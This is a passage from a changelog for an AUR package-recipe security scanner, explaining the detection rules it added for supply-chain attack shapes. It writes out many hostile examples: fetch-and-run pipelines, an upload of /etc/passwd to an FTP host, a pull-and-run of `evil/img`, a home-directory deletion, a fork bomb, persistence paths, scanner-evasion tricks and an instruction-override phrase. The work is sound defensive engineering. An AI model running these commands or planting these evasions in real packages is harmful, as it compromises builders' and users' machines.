  its argument, which was the open half. `set -- *.sh; bash "$1"`,
  `mapfile -t A < <(ls *.sh); bash "${A[0]}"`, `IFS=:; bash $*` - `bash` is
  perfectly literal in every one, so X002 stands down and every
  path-pairing rule looks for a filename that is not there. An executor
  whose file argument is a positional parameter, an array element or a glob
  appears in no package in the benign corpus; recipes name the file they
  mean.

- **R151: boot or image material built from the source tree.** `dracut
  --include "$srcdir/x"` injects a build-tree path into the initramfs,
  which runs before userspace exists and before any filesystem the user can
  inspect is mounted. Shipping a kernel module is `install`; *generating*
  boot material during a build captures the builder's machine.

- **A content address is still an address.** `magnet:` names bytes rather
  than a host and carries no `://`, and the address matcher finds addresses
  by that marker - so the client was recognised and the fetch scored
  nothing, because nothing could be attributed to it.

- **A sandbox root makes an absolute path tree content.** `chroot
  "$srcdir/root" /bin/sh /x.sh` ran an unread script and matched nothing:
  W001 wanted a bare executor word, not `/bin/sh`, and treated the leading
  slash of `/x.sh` as marking a system file.

- **W005: a build target whose recipe was not read.** The third of the
  manifest trio - X020 claims the recipe *writing* the steps, W004 the
  recipe naming a manifest *file*, and this one the recipe naming a
  *target* inside a manifest it did not name: the implicit `Makefile` that
  came with the archive. `make install` is a contract every build system
  honours; `make dist-hooks` names a recipe that exists only in this
  project's Makefile.

  This rule exists because a measurement contradicted an assumption. The
  shape was dismissed as near-universal - "every package runs make" - and
  measured, a *non-standard* target turns out to appear in 0.3% of the
  benign corpus. The assumption was wrong.

- **A fork bomb written without a pipe.** S001 required the `name|name`
  spelling, so `boom(){ boom & boom & }` - the same bomb joined by `&`
  instead of a pipeline - read as clean. The essential property is that the
  body reaches its own name more than once and backgrounds, not which
  operator joins the calls. Recursion without backgrounding terminates,
  backgrounding without recursion is one job, and a name inside an `echo`
  is a string; all three stay quiet.

- **R150: an unread script executed during packaging.** The scoring half
  of W001, and the split is measured rather than assumed. `package()`
  stages files into `$pkgdir`; it is not where software gets built, and its
  output *is* the package. Of the three benign corpus diffs that execute a
  script from the unpacked tree, two are in `build()` and one in
  `prepare()` - none is in `package()`. So W001 keeps weight 0 over the
  surface where the behaviour is ordinary, and the subset that is not
  ordinary is scored. The W contract is unchanged: a W finding never
  carries weight, so a surface that deserves weight becomes a different
  rule rather than a heavier W.

- **X020: the recipe writes the build steps the engine runs.** A build
  system reads its steps from a manifest, and normally that manifest is
  upstream's or generated by cmake from upstream's. When the *recipe*
  writes one, the commands in it are the packager's - and they are data
  until the engine runs them, so no execution rule reads a `command =`
  line. `cat > build.ninja` with `command = bash $srcdir/x.sh` inside puts
  an execution one indirection away from every rule that looks for one, and
  the invocation that follows is a bare `ninja -C build` nobody looks at
  twice.

  It claims authoring, not transforming: `sed -e … Makefile > dest`
  rewrites steps that came from upstream, which is how a DKMS package
  substitutes a kernel version and was this rule's only benign fire before
  the distinction was drawn.

- **W004: a build engine pointed at a manifest nobody read.** X020's
  counterpart. Anchored on an *explicit* `-f`/`--file` argument, because a
  bare `make` also runs a manifest nobody read and that is most of the
  ecosystem. Naming a particular file is a choice, and the choice is the
  observable. A declared manifest stays R138's, where the bytes are at
  least checksum-pinned.

- **R149: a committed config pointing at a build-only path.** The
  symmetric half of R145. That rule reads content the recipe *generates*
  into `$pkgdir`; this one reads content the recipe *committed* and then
  ships. Same observable - `$srcdir`, `$startdir`, `$PWD` exist only while
  the package is built, so a shipped file naming one is either broken on
  arrival or aimed at a directory whoever wrote it expects to control when
  it is read - and the value has to sit in a directive that runs
  something, because a `Comment=` mentioning a build path is a cosmetic
  mistake and an `Exec=` naming one is a command pointed at nothing.

  **The key list went the same way the executor list did.** The first
  version asked "is this an exec directive" and carried a short catalogue
  to answer it, on the reasoning that it only had to be good enough.
  Measured against thirty verticals from the audit, it cost twelve:
  `System(...)` in an Asterisk dialplan, `binary=` in an rsyslog action,
  `load_module` in nginx, `NOTIFYCMD` in upsmon, `DisplayCommand` in sddm,
  `HOOKS=()` in mkinitcpio, a bare `source` in a shell rc, a mailcap entry
  with no key at all. A short list was not a smaller version of the
  problem; it was the same problem.

  So the question is inverted. A shipped file that names a build directory
  is broken on arrival whatever field holds the path. What genuinely does
  not matter is a field that only *describes* - `Comment`, `Description`,
  `Name`, `Icon`, `URL`, `X-*`, a comment line - and those are few and
  stable. All thirty verticals now fire; 249 committed files across 81 real
  AUR repositories produce nothing.

  This closes the config-carried-exec family an audit raised across 70
  reports. Six of its ten worked examples already scored 50-75 (writes to
  absolute system paths trip R058/R128/R054, and generated `$pkgdir`
  content trips R145); the four that did not were all the same shape, a
  directive in a *committed* file. That is one rule, not the 34
  host-specific ones proposed - `dhcp-script`, `omprog`, `exec_dset`,
  `FoomaticRIPCommand` and so on are an unbounded list, and the attacker
  picks the next daemon.

  The proposed design also tested "does this value reference a fetched
  artifact" by accepting any path ending in `.sh`, `.py` or `.js`, which
  makes `ExecStart=/usr/share/p/launcher.sh` - the most ordinary line a
  packaged unit can contain - a CRITICAL finding. Its own negative example
  passed only because `firefox` has no file extension. Anchoring on the
  build-only path is what keeps that quiet.

- **A new series: W, for what could not be checked.** Every other rule says
  "this recipe does something". A W finding says "this analysis could not
  check something", attached to the line it applies to - the same act as a
  coverage gap, moved from the run to the line.

  It exists because the alternative to pricing a common behaviour is not
  pricing it *less*, it is saying nothing at all. The largest such surface
  is a recipe that unpacks a declared, checksummed archive and runs a script
  from inside it. The checksum proves the bytes arrived unaltered and says
  nothing about what they do, and this analysis never reads them. Weighting
  that would put a finding on a large share of the ecosystem and make the
  number mean less, which is exactly what B10 forbids. Silence was the other
  option, and silence is what the boundary documentation had to describe as
  something TrustSight cannot see.

  It can see it. It must not price it. So **W001** says so and scores
  nothing - and is shown anyway, unlike every other weight-0 non-critical
  finding, because a statement whose only value is to a reader is worthless
  if filtered.

  The pattern is deliberately its own rather than shared with R138. R138's
  capture is allowed to be loose: a token that is not a path cannot equal a
  declared basename, so `python3 -m build` capturing `-m` costs that rule
  nothing. A rule that *prints* the path has no such luxury - reusing the
  loose capture produced evidence like `log\.txt|/var/log/ventoy.log|g`
  from inside a `sed` script, the MIME type in
  `x-scheme-handler/orcaslicer`, and the `usr/bin/env` of a shebang. Two
  shapes qualify and no third: an interpreter naming a file, and a `./`
  invocation. 3 of 3,246 benign diffs (0.09%), each a genuine case.

  Two more members followed the same contract. **W002** reports a build
  step that resolves from a language registry - `npm install`, `pip install
  -r`, `cargo fetch` - where the recipe names a *set* of packages and a
  registry decides which bytes satisfy it, at build time, after review.
  That is already the `unpinned_build_deps` coverage gap; what a gap cannot
  say is *where*, which is the difference between a property of the
  analysis and a property of the recipe. **W003** reports a `patch` or
  `git apply` naming bytes that are not in this repository: a committed
  patch is one R146 reads, and a declared remote one sits behind a checksum
  this tool never downloads. A tarball is upstream's own code; a patch is a
  change to it that the *packager* chose, which makes it more interesting
  to a reader, not less - and still unreadable here.

  W003 is the highest-firing member at 2.06% of the benign corpus, and that
  is the correct answer rather than a tuning problem: applying a patch whose
  bytes are not in the repository is both common and genuinely unread.

  Fixing that capture also tightened R138: its `./x` arm was never anchored
  to a command position, so it matched the `./` inside `sed 's|./log…'` and
  inside `../x.patch`.

- **A named `.install` hook the tree read did not include.** An `.install`
  scriptlet runs as root on the installing machine, and the recipe *names*
  it rather than containing it. Once a tree had been read the absence of
  `tree_not_analyzed` said the committed files were examined - but a
  manifest that does not hold the named hook means the one file whose whole
  purpose is to run as root was never examined, and the report claimed the
  tree was complete.

- **A stale ruleset degrades the verdict instead of passing quietly.**
  `rules.toml` is written once, at install time, and never rewritten, so a
  user who never hand-edits rules runs whatever the defaults were on the
  day the tool first ran. `sync-rules` *reports* the divergence but refuses
  to adopt shipped patterns, because it cannot tell a stale rule from a
  customised one except through a hand-maintained list of superseded
  patterns.

  That refusal is defensible - overwriting a user's edits would be worse.
  Doing it silently is not: a run against a drifted ruleset has a detection
  surface that is not the one this version documents, and B2 says an
  analysis that could not do what it claims must say so. It now raises a
  `ruleset_drifted` coverage gap. This one bit the audit itself twice, when
  triage passes measured against a stale local file and reported rules as
  broken that had shipped fixed.

- **R148: the metadata and the recipe describe different packages.**
  `.SRCINFO` is generated *from* the PKGBUILD, and the analysis prefers it
  wherever it is richer - structured `depends`, expanded sources. Nothing
  compared the two, so a `.SRCINFO` naming a source the recipe does not was
  believed, and an AUR helper resolving dependencies from metadata while
  makepkg builds from the recipe read two different descriptions of one
  package. Compared by *host*, because a PKGBUILD writes
  `source=("$url/archive/v$pkgver.tar.gz")` and the metadata carries the
  expansion; no package among 50 real AUR repositories has a `.SRCINFO`
  host its PKGBUILD does not also name.

- **One host, one spelling.** Case, the root-label dot, the default port
  and userinfo each name the same machine, and every subsystem normalised a
  different subset. `classify_url` lowercased the host for one check and
  handed the *raw* URL to the suffix extractor for the next, so
  `https://GITHUB.com/...` classified as `unknown` while the lowercase form
  classified as `trusted_forge`. Novelty had the mirror: five spellings of
  one resource were five first-seen events.

- **One maintainer, one identity.** `Alice`, `alice`, Cyrillic `аlice` and
  a zero-width-split `ali<ZWSP>ce` hashed to four identities and read as one
  person. Rotating the spelling split the longitudinal history, so an
  account could stay permanently new - stability priors and the observation
  floor never accumulate against an identity that is different every time.
  Every folding step is a no-op on a plain ASCII name, because this is the
  chokepoint the shipped seed corpus was hashed through.

- **R012 stopped guessing the noun.** The rule matched an ignore-verb, a
  backward reference and then one of eight enumerated nouns, so
  "disregard all earlier **directions**" passed. Measured against the
  corpus, the verb plus the backward reference appears in *zero* benign
  lines - the noun list was doing no work against false positives and only
  limited what the rule could see. It is gone.

- **R147: a checksum array shorter than its source array.** makepkg pairs
  them by position and no rule looked at the two lengths together, so a
  source slipped in beside a checksum list nobody recounted scored nothing
  but priors. Two things had to be right first: a diff shows a hunk, not a
  file, so an array that continues into unchanged lines is only partly
  visible (counting the visible part fired on 26 benign packages); and
  `name::url` is makepkg's rename form and is *one* source, which a token
  regex read as two.

  Checksum arrays are also read resolved now: `_cs=SKIP` above
  `sha256sums=("${_cs}")` reported that a checksum had been set.

- **X018: an interpreter one-liner that assembles the name it calls.**
  X010 and R044 look for a module name inside a `-c` script, and a keyword
  list in a language with string concatenation is a suggestion - one `+`
  in `importlib.import_module("url"+"lib.request")` defeated all three
  rules at once. The rule looks for the assembly instead: reflection
  primitives and glued-together name literals.

- **X019: host material sent or packaged.** A DNS query whose name is
  computed, or an ICMP payload that is a hex dump, carries data out in a
  field nobody reads as a channel. The other half sends nothing at build
  time: `env`, `/etc/machine-id`, `~/.ssh` and shell history written into
  `$pkgdir` exfiltrate later, when the package is published.
  `install -D /etc/machine-id` tripped R058; `cat` reading the same file
  into the same place was silent.

- **Three fetch clients and a way out.** libwww-perl's CLI
  (`lwp-request`, `lwp-download`) and BSD `fetch(1)` were uncatalogued.
  So was `git push`: the inventory had clone, fetch and pull - every way
  to bring code in and no way to send it.

- **R089 could not see the families built to evade it.** Its stage map was
  written when the R-series was the whole ruleset, so a diff carrying
  nothing but evasion, or nothing but sabotage, could not reach the stage
  count however many rules fired. The X- and S-families are mapped now,
  and R089 itself is shown: it says the diff holds a staged attack chain,
  which changes how every other finding should be read, and it was
  computed and then dropped before anyone saw it.

- **A machine consumer can tell clean from unread.** `flagged: false` is
  not "this package is fine", it is "the score this run produced did not
  reach the threshold" - and when coverage is incomplete that score came
  from a partial read. The JSON body now carries `fully_vetted`.

  Relatedly, a dependency the diff *adds* and the run did not analyse now
  raises `deps_not_scanned`. Dependency findings still never move the
  parent's score, which is right; what changes is that the report stops
  claiming a complete analysis of a change it only half read.

- **Padding a line past the clamp no longer blinds every rule at once.**
  Rules match against lines truncated to `MAX_RULE_LINE_BYTES`. Pad a
  `curl … | bash` with leading whitespace so the command starts past the
  ceiling and *every* pattern rule went blind together - R001, R010, the
  whole X-family - leaving only the `line_truncated` gap, which carries no
  weight.

  The clamp is not the defect. It bounds matching cost on attacker-chosen
  input, which is why it cannot be raised or replaced with sliding windows:
  the cost is the attacker's to choose and bounding the input bounds every
  pattern at once. What was wrong is that it measured *bytes*, and 8192
  leading spaces are 8192 bytes of nothing. A shell ignores leading and
  repeated whitespace, so collapsing it before measuring changes what no
  line means, costs one linear pass, and spends the budget on content.
  Padding must now be made of real tokens, which a reader can see.

- **Thirteen persistence paths R054 named but could not match.**
  `/etc/ld.so.preload`, `tmpfiles.d`, `sysusers.d`, `polkit-1/rules.d`,
  `/etc/profile`, `/etc/bash.bashrc`, systemd `system-generators`,
  `/etc/rc.local`, `update-motd.d`, `/etc/skel`, `/etc/environment`,
  `sysctl.d` and `binfmt.d` all staged into the package root for nothing.

  `/etc/rc.local` is the instructive one: it was already *in* the rule,
  inside a group the pattern follows with a `/`. A directory needs that
  slash and a file must not have one, so the rule listed a path it could
  never match. The list is now split by that distinction. Each addition was
  measured on its own against the benign corpus and each was at zero;
  `udev/rules.d`, `modprobe.d` and `apparmor.d` stay out for the reason
  already recorded - driver and library packages ship them as a matter of
  course.

- **Four ways to ask for root.** R009 named `sudo`. `doas`, `pkexec` and
  `run0` do the same thing, and naming only the first tested which tool the
  writer preferred rather than what it does. `setcap cap_setuid+ep` grants
  what the setuid bit grants by a different mechanism, and R053/R059 both
  keyed on `chmod` - a capability is not a mode, so it fired nothing.

- **A variable defeated every sabotage rule at once.** The S-family read
  literal text, so `dd of="$D"`, `systemctl stop "$U"` and `rm -rf "$T"`
  each evaded the rule written for it. The name is the attacker's to choose
  and the value is right there in the diff; the fetch and delivery rules
  resolve for exactly this reason. They now read resolved lines.

  S002 had a second, sharper version of the same problem: its build-tree
  stand-down tested the *whole line*, so `rm -rf "$srcdir/.git" ~` cleared
  a build directory and the operator's home in one command and the first
  silenced the second. One `$srcdir` token was a licence to delete anything
  standing next to it. The stand-down is now per-argument.

- **An override above an unchanged build step.** X012 read added lines
  only - right for asking what a diff introduced, wrong for asking what an
  override redirects. `export CC="$srcdir/mcc"` added directly above an
  unchanged `make` is the shape where the attacker supplies one line and
  the existing recipe supplies the rest, and it was the one shape the rule
  could not see. It also required a `/` after `$srcdir`, so
  `PATH="$srcdir:$PATH"` - the plainest spelling of the plainest case -
  matched nothing.

- **A glob in command position.** `/usr/bin/c?rl -s URL | bash` runs curl;
  the word in the diff is not the name of any program, and what runs is
  whatever the glob finds on disk. Every other X002 shape answers "the
  reader cannot tell what runs from the text" and a glob answers it the
  same way - it was simply not on the list. R041 gained the same treatment
  for `/dev/t?p/`, where bash expands the glob when the redirect runs.

- **X017: a command where a command is not expected.** Every rule that
  reads execution reads a command. `--checkpoint-action=exec=`,
  `--to-command=`, `find -exec sh {}`, `enable -f` and `hash -p` put it in
  a flag value or a builtin's argument, so the line reads as archive
  extraction, a file search, or shell configuration. `find -exec` is
  narrowed to an executor because the ordinary use is this rule's opposite.

- **R138 gained the three arms R137 already had.** The pair ask the same
  question of a fetched file and a declared one, and only R137 could see
  `sh < "$srcdir/setup.sh"`, a bare `"$srcdir/setup.sh"` in command
  position, or `make -f` on a downloaded makefile.

- **Two API-boundary fixes.** `analyze_text` never type-checked its
  timestamps, so passing a date string - the obvious mistake - raised a
  `TypeError` from inside the temporal rules instead of naming the argument
  that was wrong. And a maintainer name reached `Report` carrying whatever
  terminal escape it was given: the CLI renderer cleans what it prints, but
  the fix belongs where the fact becomes a report, not in one of the things
  that reads it.

- **R146: a committed companion that fetches and runs code.** A `.service`
  whose `ExecStart=` pipes a download into a shell is the payload, and
  nothing read it. The diff showed the recipe staging the file - ordinary
  packaging, scored as such - while the bytes that matter lived in a file
  the diff does not touch.

  That split is available to an attacker as a schedule: commit the unit in
  one push, where it is a file nobody runs, and add the `install` line in a
  later one, where the reviewer sees a single unremarkable line. Neither
  push contains an attack. Both together do.

  Reading the content at all required a change underneath it. The tree
  manifest kept 64 bytes per file, which answers "is this an ELF" - all
  R118 ever asked - and cannot answer "what does this unit run". Files whose
  names say a recipe can ship or apply them are now read to 16 KiB, with a
  512 KiB ceiling across the tree, and a companion cut short by either bound
  marks the tree incomplete rather than reporting a full examination of a
  partial read. A patch is read by its *added* lines: a hunk that removes a
  `curl … | sh` is the opposite of this rule's subject.

- **X016: a fetch piped into something the analyser cannot name.** R001
  claims `curl … | bash` by naming the executor, and every executor it does
  not name was a bypass: `deno`, `bun`, `pwsh`, `julia`, `Rscript`, `guile`,
  `zx`, `escript`, `mruby` and `fennel` each ran the fetched bytes for an
  undeclared-fetch HIGH and nothing more.

  Adding those words would fix those words, and the attacker picks the next
  one. So the list is inverted. The set of interpreters is unbounded and
  chosen by the attacker; the set of things a recipe legitimately pipes a
  download into is small and chosen by the ecosystem - an extractor, a
  checksum, a text filter, a viewer. Those are enumerated, and anything else
  at the end of a fetch pipeline is claimed: not because the word is known
  to be an interpreter, but because it is *not known to be a consumer*. The
  rule stands down on the executors R001 already claims, so one pipeline
  produces one claim. Zero occurrences in the benign corpus.

- **R145: a packaged file naming a build-only path.** The largest silent
  family was a configuration file the recipe *generates* into the package
  root whose exec slot names a script - an i3 `bindsym … exec`, a polybar
  `exec =`, a udev `RUN+=`, an acme `RELOADCMD=`, a mutt `macro … !bash`.
  Every rule that looks for execution reads the recipe's own commands, and
  none of those lines is a command the recipe runs. They are text, and what
  runs them is the user's session, later, on a different machine.

  What separates them from the ordinary case is not the exec slot, which is
  what those files are *for* - a `.desktop` with `Exec=/usr/bin/p` and a
  `bindsym $mod+d exec dmenu_run` are exactly right and stay silent. It is
  which path the slot names. `$srcdir`, `$startdir` and `$PWD` exist only
  while the package is built, in a directory pacman never ships. A shipped
  file naming one is either broken on arrival or aimed at a directory
  whoever wrote it expects to control when it is read.

  The rule is about the pairing of a write into `$pkgdir` with content
  naming a build-only path, which is why it is not a line pattern:
  `install -Dm755 "$srcdir/x" "$pkgdir/usr/bin/x"` names both on one line
  and is the most common line in the ecosystem. There `$srcdir` is an
  argument to a copy; here it is inside the bytes being written.

- **R144: a packaged file pointing at a world-writable path.** A config
  staged into the package root that names a program under `/tmp`,
  `/var/tmp` or `/dev/shm`. Those directories are writable by everyone, so
  whatever the config names can be replaced by any local user between the
  package being installed and the config being read - and the config is read
  as root for a unit, a PAM line or a cron entry.

  It is both halves at once: an attacker shipping this is arranging for
  their own planted file to run, and a maintainer shipping it by accident
  has handed the same lever to anyone with a shell on the machine. The
  target is never in the diff, which is why every rule that looks for a
  payload found nothing - the observable is the *destination*. Zero
  occurrences in the benign corpus; build-time use of `/tmp` as scratch
  space needs both halves on one line and stays quiet.

- **A heredoc body is content, not a shell assignment.** `cat >
  "$pkgdir/…/e.service" <<EOF` with an `ExecStart=` payload inside was
  folded away as an assignment and never matched - the same defect the
  config-directive fix addressed for a unit file *shipped* whole, reappearing
  for one *generated* by the recipe. Inside a heredoc the text is content
  whatever the enclosing file is, so the distinction now applies to a region
  as well as to a file.

- **A value pulled out of a data file and handed to a shell.** `jq -r .cmd
  cfg.json | bash` is the same shape as X001's decoder arms with a *query*
  in place of an algorithm: the field lives in a JSON file no rule reads, so
  what executes is chosen by the data rather than written in the recipe, and
  a reviewer sees a config lookup. `yq`, `tomlq`, `xmlstarlet sel`,
  `xmllint --xpath`, `sqlite3 .read` and the `json.load`/`JSON.parse`
  interpreter forms join the same arm. Reading a data file without running
  the result stays quiet.

- **A hook flag carries code like an environment variable does.** X014's
  carrier is "a setting whose value is code", and a command-line flag is the
  same carrier with a different spelling: `restic --option pre-exec=`,
  `borg --pre-hook`, `rsync -e "ssh -o ProxyCommand=…"`. The tool runs the
  value; the recipe only names it.

- **`KEY=value` means two different things in two kinds of file.** In a
  shell file the value goes into the variable table and is matched where it
  is *used*, so folding the line away is right. In a systemd unit or a
  `.desktop` file there is no later use - the value **is** the command - and
  folding it away removed the line from matching altogether:
  `ExecStart=/bin/sh -c "curl ... | bash"` produced no candidate at all, so
  no resolved rule ever saw it.

  That one root cause accounts for most of an audit family spanning seven
  rounds - config-carried command values in systemd units, `.desktop` files,
  rsyslog, syslog-ng, dnsmasq, xinetd, logrotate, NetworkManager dispatcher
  scripts and cron entries. The fix is a file test, not fifty directive
  names: outside a shell file, a `KEY=` line stays a candidate.

- **Authentication and session hooks are persistence.** R054 gained
  `pam.d`, `NetworkManager/dispatcher.d`, `xinetd.d`, `init.d`/`rc.d`,
  `rc.local` and `logrotate.d`: a PAM line runs on every authentication, a
  dispatcher script on every network change, an xinetd entry on every
  connection. Each appears in zero of the 3,246 benign diffs - a package
  that needs one ships it as a declared source file, which R054 reads either
  way.

- **A redirect makes a line a write, not a message.**
  `echo "session optional pam_exec.so /opt/e.sh" >> "$pkgdir/etc/pam.d/…"`
  was classified as something addressed to a reader, which is how a recipe
  ordinarily appends to a system config. The first attempt searched the
  whole line for `>` and put back a false positive this changelog already
  records - `echo "==> sudo pacman -S qemu"` contains one as punctuation.
  The check now looks only outside quotes, and is a scan rather than a
  regex: the obvious pattern backtracks catastrophically with no redirect
  present, at 942 ms on a full-length line.

- **Tracking what cannot be read.** The upstream-payload gap is real: a
  checksummed tarball's bytes are not in the diff, so a recipe can look
  untouched while the code it builds is replaced. What *is* in the diff is
  the carrier's **identity**, and a change to that under a stable version is
  the observable form of the swap. R079 already applied that reading to a git
  ref and C001 to a checksum; three carriers had no such claim.

  `C008` (HIGH) claims a **submodule gitlink** or a **Git-LFS object id**
  moving while `pkgver` does not - each names content the repository does not
  contain, so moving one is a content change with no content in the diff.
  `C009` (INFO, weight 0) reports the same move alongside a version bump, so
  the pair is visible rather than only the alarming half.

  The third carrier needed no new reading at all. git emits *no diff body*
  for a binary, so a committed ELF being replaced produced an empty diff and
  R118 reported the same thing either way - it claims the file's presence,
  not its identity. A git blob id is a content hash and both trees are
  already open, so comparing them answers "did this file change" exactly
  without opening either version. Replaced fires; untouched and newly-added
  stay silent.

  This does not close the upstream gap, it changes what the gap costs: a swap
  must now happen either under a new version, where a reader is looking, or
  under a stable one, where it is claimed. A first analysis has no previous
  identity to compare against, and a legitimate release containing a payload
  is indistinguishable from an ordinary update - those remain out of reach by
  construction.

- **X015: work scheduled to run after the build.** A package *declares*
  units and timers as files, which pacman installs and an administrator
  enables; R054 claims those and a reader can see them. Running `crontab -`,
  `systemd-run`, `at`, `incrontab` or `systemctl start` during the build is a
  different act - it registers work on the machine doing the building, now,
  outside anything pacman records or can remove. The scheduled command is
  usually a path the recipe just wrote, so the chain reads as *fetch, write,
  arrange to run later*, and every arm of it stopped at R061's
  undeclared-fetch HIGH because the run never happens on a line any execution
  rule reads. `systemctl enable` is deliberately absent: an `.install`
  scriptlet enabling its own unit is ordinary packaging.

- **A driver's command argument is still an execution.** `expect -c "spawn
  bash s.sh"`, `script -qfc "bash s.sh"`, `tmux new-session -d "..."`,
  `screen -dmS x bash s.sh`, `find ... -exec bash {} +` and
  `xargs -I{} bash {}` all run a command the execution patterns never saw,
  because what they matched was the driver's own name. The command text is
  now re-scanned with the same vocabulary - once, not recursively, since a
  driver running a driver is not a shape worth unbounded re-entry on
  attacker text. For `find` the `{}` resolves through the `-name` pattern;
  for `xargs` it resolves through the left-hand side of the pipe, because a
  bare `*` would name every file and so claim nothing about any of them.

- **Executing from a clone pairs with the clone.** A checkout names a
  *directory*, and everything under it came from the remote, so the pairing
  is by prefix rather than by filename: `git clone URL r` then `bash
  r/run.sh` is a fetch and an execution of what it fetched. `make -C r`
  needed one step more - `-C` had been excluded from the implicit-input arm
  on the reasoning that it "names the input explicitly", but it names a
  *directory*, not a file, so the implicit input still applies relative to
  it.

- **Container and object stores were the widest remaining blind spot.**
  `docker pull evil/img && docker run evil/img` fetches a filesystem and
  executes its entrypoint; `snap` and `flatpak` install and then run confined
  applications; `helm` applies charts that carry hooks; `lxc launch` starts a
  container from an image. None of them names a URL, which is why the fetch
  inventory never saw them - but "resolve a name from a registry and run what
  comes back" is exactly what X011 already claims, so they belong there.

  The object stores are the same fact with a different notation: `s3cmd get
  s3://…`, `aws s3 cp`, `rclone copy remote:/…`, `ipfs get <cid>`,
  `git lfs pull`. Where the address carries a scheme, R061 attributes it as
  before. Where it is opaque - a content identifier, a remote name - there is
  no URL to quote, so the honest claim is the *pairing*: the fetch writes a
  file and the next line runs it, which R137 now sees because these clients
  name their destination positionally or with `-o`.

- **Fullwidth Latin is a whole homoglyph alphabet.** `ｃｕｒｌ` renders as the
  real name and executes as one that does not exist. U+FF01-U+FF5E folds onto
  ASCII by a fixed offset of 0xFEE0, and the confusable table listed only the
  handful of individual lookalikes that had been reported. Generated rather
  than enumerated, because the mapping is arithmetic and ninety-four
  hand-written entries invite one to go missing. It now scores the same 60 as
  the Cyrillic spelling that was already caught.

- **X014: an environment variable whose value is code.** X012 covers a
  toolchain *path* redirected into the source tree - which binary the next
  compile step invokes. This is the other half. `BASH_ENV` and `ENV` are
  sourced by every non-interactive shell that bash or sh starts, so setting
  one makes every later `bash -c`, every sub-make recipe line and every
  helper script run the named file first; `PROMPT_COMMAND`, `PS0` and `PS4`
  are evaluated as commands; `BASH_FUNC_x%%` smuggles a whole function
  through the environment; `GIT_SSH_COMMAND`, `LESSOPEN` and `LD_AUDIT` are
  run by the tools and the loader that read them. The assignment *is* the
  execution. It stands down on the inert values that make one of these quiet
  rather than active (`PAGER=cat`, `EDITOR=true`), and none of the covered
  variables appears in the benign corpus.

- **A `for` loop was only the most visible binding.** The positional form
  (`set` with a `"$srcdir"/*.sh` argument list)
  puts the same glob into `$1` and `$@`, `A=(*.sh)` into an array cell, and
  `mapfile -t A < <(ls *.sh)` fills one from a pipeline - and the execution
  is `bash "$1"`, `bash $@` or `bash "${A[0]}"`. Every one of those scored
  zero while the `for` spelling scored 85. Two things had to change: the
  binding forms, and the fact that bindings were computed per *line* when
  the binding and the execution are two statements - so a one-liner was the
  only shape that could ever resolve.

- **`bash -c "$E"` where `E` was assigned earlier.** The same dynamic payload
  as `bash -c "$(...)"` with the substitution moved one line up; R040 saw
  only the inline form. A bare `$NAME` argument is dynamic too, and what
  reaches the pattern unresolved is precisely what the tokenizer could not
  read.

- **Run-a-remote-module verbs.** `cargo script <url>`, `bun x <url>`, `pkgx
  <url>`, `uvx <url>` and `nix run` fetch and execute in a single word with
  no install step to notice - the one-shot runner class again, one ecosystem
  further on.

- **A sandbox is a wrapper like any other.** `bwrap --ro-bind / / bash s.sh`
  executes `s.sh` exactly as `bash s.sh` does, and the fetch that wrote it
  paired with nothing - `chroot`, `bwrap`, `firejail`, `nsjail`, `unshare`,
  `proot` and the container entrypoints all left the chain at 50. They take
  *positional* arguments (`chroot /tmp/root`, `bwrap --ro-bind / /`), so the
  flags-only wrapper form could not reach the executor past them; the
  vocabulary now carries both shapes.

  This was the third time a second copy of a shared list drifted:
  `delivery._EXEC_PREFIX` was its own wrapper inventory, so additions to
  `config.EXEC_WRAPPER` reached R001's pipe arm and not R137's pairing. It
  reads the shared definition now, and a test asserts it.

- **A keyring is a trust root.** X013 gains `gpg --import`, `--recv-keys`,
  `pacman-key --add`, `apt-key add` and `rpm --import`: importing a key makes
  every later signature check pass against it, which is the same substitution
  as replacing a CA bundle with verification left switched on, so it reads as
  diligence.

  It stands down on the pattern a signature-verifying package actually uses -
  `gpg --homedir="$dir" --import "$srcdir/maintainer.gpg"` - where the key
  arrives through `source=()`, so makepkg checksums it and the diff shows any
  change. The one benign-corpus hit was exactly that shape. A key *fetched* at
  build time is not covered by that chain, and R061/R137 claim the fetch on
  its own line.

- **`ld.so.conf.d` belongs in the persistence surface after all.** A directory
  added to the loader search path is code loaded into every process that
  starts afterwards. It was excluded in a first pass that measured five paths
  together and read the aggregate as if it applied to each; measured on its
  own it appears in **zero** of the 3,246 benign diffs. `tmpfiles.d`,
  `udev/rules.d` and `modprobe.d` stay out on their own numbers.

- **A loop was a blind spot in two separate places.** `for f in *.sh; do
  bash "$f"; done` executes every committed helper, and neither half of that
  was read: `do` was not treated as introducing a command, so the loop body
  produced no execution at all, and a loop variable or glob names a *set* of
  committed files, which an equality test against the manifest could never
  match. The literal spelling scored 85 and every loop spelling scored 0.
  Both are fixed - `do`/`then`/`else` are command positions in shell grammar,
  a variable and a `*` are the same wildcard for matching, and a bare loop
  variable resolves through its `for ... in` binding. A pattern that would
  match everything still claims nothing, because it names nothing.

- **A directory paired with another directory.** Two empty basenames compare
  equal, so `install -d "$pkgdir/usr/share/icons/"` and an unrelated `/opt/`
  read as "writes /usr/share/icons/ and then executes it" - a Critical on a
  package installing icons. A directory is not a payload whichever verb
  created it, and the filter is applied once for every write arm rather than
  guarded per arm.

- **An upload was described as a download.** R061 claimed `curl -T
  /etc/passwd ftp://host` as an undeclared *download*, which is the wrong
  direction for the one operation that takes data off the machine; R087 read
  a host list only, so an upload anywhere but a drop host was never claimed
  as one. R087 gains a second condition - and deliberately not "any host":
  `tests/test_gap_rules.py` pins the design principle that the rule is
  "defined by an auditable host list, not by a guess about what an endpoint
  is for", so the addition is a second auditable list, of paths no build
  artifact lives at (`/etc/`, `~/.ssh/`, `$HOME/`, `/root/`, `/proc/`). A
  build sends nothing off the machine; one reading from outside its own tree
  is not uploading a build artifact. `curl -F file=@report.json
  https://ci.example.com` stays quiet under both.

- **A `NameError` on the full-AUR property path.** A sweep replacing
  `.splitlines()` with the tokenizer's `split_lines()` renamed the receiver
  instead of the call: `new_pkgbuild.splitlines()` became
  `new_split_lines(pkgbuild)`. That is a live crash on every property
  extraction with no `.SRCINFO` to prefer - the fallback the function exists
  to provide - and nothing exercised it, so the suite stayed green. Found by
  `ruff`'s undefined-name check rather than by a test, which is the useful
  detail: a rename that produces a valid-looking call is invisible to
  everything that does not run it.

- **R054 claimed cron and system units; the rest of the autostart surface
  was silent.** A `.desktop` in `xdg/autostart` starts with the session, a
  systemd **user** unit starts with the user's login (no root required, and
  if anything more reliable than a system unit - it had been pinned in a test
  as *non*-persistence), `profile.d` and `bash.bashrc.d` run in every new
